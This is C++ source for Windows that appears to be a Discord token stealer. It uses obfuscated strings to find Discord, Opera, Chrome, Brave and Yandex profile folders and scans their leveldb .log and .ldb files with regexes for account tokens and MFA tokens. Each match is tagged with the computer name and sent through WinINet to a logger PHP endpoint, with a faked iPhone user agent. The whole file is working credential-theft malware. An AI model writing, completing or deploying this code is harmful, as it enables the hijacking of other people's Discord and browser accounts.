#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <Wininet.h>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include "obfuscate.h"
#pragma comment(lib, "wininet.lib")
namespace fs = std::filesystem;
void senddatawebstate(std::string token) {
    HINTERNET wbNet = InternetOpenA("Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 1, NULL, NULL, NULL);
    HINTERNET retFile;
    std::string rtn;
    if (wbNet) {
        retFile = InternetOpenUrlA(wbNet, ("http://localhost/loggerwebsate.php?34fd356ef5=" + token).c_str(), NULL, NULL, NULL, NULL);
        if (retFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(retFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(wbNet);
            InternetCloseHandle(retFile);
        }
    }
    InternetCloseHandle(wbNet);
}
bool hasEnding(std::string const& fullString, std::string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}
bool elrahmiPathfuckdcdataend(const std::string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}
std::vector<std::string> elrahmiPathfuckdcdata()
{
    std::vector<std::string> targetLocations;
    char* roaming;
    size_t len;
    _dupenv_s(&roaming, &len, OBFUSCATE("APPDATA"));
    char* local;
    size_t len2;
    _dupenv_s(&local, &len2, OBFUSCATE("LOCALAPPDATA"));
    std::string Discord = std::string(roaming) + OBFUSCATE("\\Discord");
    std::string DiscordCanary = std::string(roaming) + OBFUSCATE("\\discordcanary");
    std::string DiscordPTB = std::string(roaming) + OBFUSCATE("\\discordptb");
    std::string Opera = std::string(roaming) + OBFUSCATE("\\Opera Software\\Opera Stable");
    std::string Chrome = std::string(local) + OBFUSCATE("\\Google\\Chrome\\User Data\\Default");
    std::string Brave = std::string(local) + OBFUSCATE("\\BraveSoftware\\Brave-Browser\\User Data\\Default");
    std::string Yandex = std::string(local) + OBFUSCATE(("\\Yandex\\YandexBrowser\\User Data\\Default"));
    targetLocations.push_back(Discord);
    targetLocations.push_back(DiscordCanary);
    targetLocations.push_back(DiscordPTB);
    targetLocations.push_back(Opera);
    targetLocations.push_back(Chrome);
    targetLocations.push_back(Brave);
    targetLocations.push_back(Yandex);
    free(local);
    free(roaming);
    return targetLocations;
}
std::vector<std::string> findMatch(std::string str, std::regex reg)
{
    std::vector<std::string> output;
    std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
    std::sregex_iterator lastMatch;
    while (currentMatch != lastMatch) {
        std::smatch match = *currentMatch;
        output.push_back(match.str());
        currentMatch++;
    }
    return output;
}
void tokenara(const std::string& loc) {
    std::ifstream ifs(loc, std::ios_base::binary);
    std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
    std::vector<std::string> master;
    std::regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    std::regex reg2("mfa\\.[\\w-]{84}");
    std::vector<std::string> check = findMatch(content, reg1);
    std::vector<std::string> check2 = findMatch(content, reg2);
    for (int i = 0; i < check.size(); i++) {
        master.push_back(check[i]);
    }
    for (int i = 0; i < check2.size(); i++) {
        master.push_back(check2[i]);
    }
#define INFO_BUFFER_SIZE 32767
    TCHAR  infoBuf[INFO_BUFFER_SIZE];
    DWORD  bufCharCount = INFO_BUFFER_SIZE;
    if (!GetComputerName(infoBuf, &bufCharCount));
    for (int i = 0; i < master.size(); i++) {
        std::string combine = infoBuf;
        combine += " Log:->>  " + master[i];
        const char* postContent = combine.c_str();
        senddatawebstate(postContent);
    }
}
void databasecheckingdcpuhhaha(const std::string& path)
{
    std::string target = path + OBFUSCATE("\\Local Storage\\leveldb");
    for (const auto& entry : fs::directory_iterator(target))
    {
        std::string strPath = entry.path().u8string();
        if (hasEnding(strPath, OBFUSCATE(".log")))
        {
            tokenara(strPath);
        }
        if (hasEnding(strPath, OBFUSCATE(".ldb")))
        {
            tokenara(strPath);
        }
    }
}